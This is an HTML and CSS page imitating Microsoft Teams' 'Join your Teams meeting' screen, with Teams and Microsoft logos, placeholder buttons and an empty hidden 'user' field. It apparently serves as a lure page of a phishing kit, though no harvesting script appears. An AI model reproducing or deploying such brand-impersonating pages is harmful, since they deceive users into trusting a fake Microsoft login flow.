<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Join Teams Meeting</title>
    <style>
        :root {
            --page-bg: #ffffff;
            --card-bg: rgba(255, 255, 255, 0.13);
            --card-border: rgba(0, 0, 0, 0.06);
            --primary: #5d6bb5;
            --primary-dark: #4d5ea6;
            --secondary-bg: rgba(255, 255, 255, 0.4);
            --secondary-border: rgba(0, 0, 0, 0.08);
            --text-strong: #1f1f1f;
            --text-link: #1a3d97;
            --muted: rgba(31, 31, 31, 0.75);
        }

        * { box-sizing: border-box; }

        body {
            margin: 0;
            min-height: 100vh;
            background: var(--page-bg);
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            color: var(--text-strong);
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 0;
            overflow: hidden;
        }

        .page {
            width: min(100%, 680px);
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            justify-content: space-between;
            padding: 18px 0 10px;
        }

        .card {
            width: min(100%, 560px);
            margin: 72px auto 0;
            background: var(--card-bg);
            border: 1px solid var(--card-border);
            border-radius: 16px;
            padding: 34px 24px 28px;
            box-shadow: inset 0 0 0 1px rgba(255,255,255,0.08);
        }

        .icon-wrap {
            width: 102px;
            height: 102px;
            margin: 0 auto 18px;
            border-radius: 14px;
            background: rgba(255,255,255,0.14);
            border: 1px solid rgba(0,0,0,0.04);
            display: flex;
            align-items: center;
            justify-content: center;
            box-shadow: inset 0 1px 0 rgba(255,255,255,0.2);
        }

        .icon {
            width: 76px;
            height: 76px;
            object-fit: contain;
            display: block;
        }

        .title {
            margin: 0;
            text-align: center;
            font-size: clamp(1.95rem, 1.8vw, 2.2rem);
            line-height: 1.25;
            font-weight: 600;
            letter-spacing: -0.03em;
        }

        .actions {
            width: min(100%, 420px);
            margin: 24px auto 0;
            display: flex;
            flex-direction: column;
            gap: 12px;
        }

        .btn {
            display: flex;
            align-items: center;
            justify-content: center;
            width: 100%;
            min-height: 52px;
            border-radius: 8px;
            text-decoration: none;
            font-size: 1.05rem;
            font-weight: 600;
            transition: transform 0.15s ease, box-shadow 0.15s ease;
        }

        .btn:hover {
            transform: translateY(-1px);
        }

        .btn-primary {
            background: linear-gradient(180deg, var(--primary) 0%, var(--primary-dark) 100%);
            color: white;
            box-shadow: 0 4px 10px rgba(91, 106, 183, 0.25);
        }

        .btn-secondary {
            background: var(--secondary-bg);
            border: 1px solid var(--secondary-border);
            color: var(--text-strong);
            box-shadow: inset 0 1px 0 rgba(255,255,255,0.2);
        }

        .download {
            margin-top: 18px;
            margin-bottom: 0;
            text-align: center;
            font-size: 1rem;
            line-height: 1.35;
            color: var(--text-strong);
            font-weight: 500;
            width: min(100%, 560px);
            margin-left: auto;
            margin-right: auto;
        }

        .download a {
            color: var(--text-link);
            text-decoration: none;
            font-weight: 600;
        }

        .download a:hover {
            text-decoration: underline;
        }

        .footer {
            margin-top: 14px;
            display: flex;
            justify-content: center;
            align-items: center;
            gap: 12px;
            flex-wrap: wrap;
            font-size: 0.82rem;
            color: var(--muted);
        }

        .brand {
            display: inline-flex;
            align-items: center;
            gap: 6px;
            font-weight: 600;
            color: rgba(31,31,31,0.8);
        }

        .app-icon {
            width: 22px;
            height: 22px;
            display: inline-block;
            vertical-align: middle;
            flex-shrink: 0;
        }

        .app-icon img {
            width: 100%;
            height: 100%;
            display: block;
            object-fit: contain;
        }

        .footer a {
            color: #5d6bb5;
            text-decoration: none;
        }

        .footer a:hover {
            text-decoration: underline;
        }

        .dot {
            font-size: 1rem;
            line-height: 1;
            color: rgba(31,31,31,0.5);
        }

        @media (max-width: 640px) {
            .card {
                padding-left: 20px;
                padding-right: 20px;
            }

            .title {
                font-size: 1.7rem;
            }

            .actions {
                gap: 12px;
            }
        }
    </style>
</head>
<body >
    <div class="page">
        <div class="card">
            <div class="icon-wrap" aria-label="Teams meeting icon">
                <img class="icon" src="img/microsoft_teams_logo.png" alt="Teams logo" />
            </div>

            <h1 class="title">Join your Teams meeting</h1>

            <input type="hidden" id="user" name="user" />

            <div class="actions">
                <a href="#" id="authBtn" class="btn btn-primary">Continue on this browser</a>
                <a href="#" id="appBtn" class="btn btn-secondary">Join on the Teams app</a>
            </div>

        </div>

        <div class="download">
            Don’t have the app?<br>
            <a href="#">Download it now</a>
        </div>

        <div class="footer" aria-label="Footer links">
            <span class="brand">
                <span class="app-icon" aria-hidden="true">
                    <img src="img/f67f208e256aefc1e277e3495e7bc32b.jpg" alt="Microsoft logo" />
                </span>
                <span>Microsoft Teams</span>
            </span>
            <a href="#">Privacy and cookies</a>
            <span class="dot">•</span>
            <a href="#">Third-party disclosures</a>
        </div>
    </div>
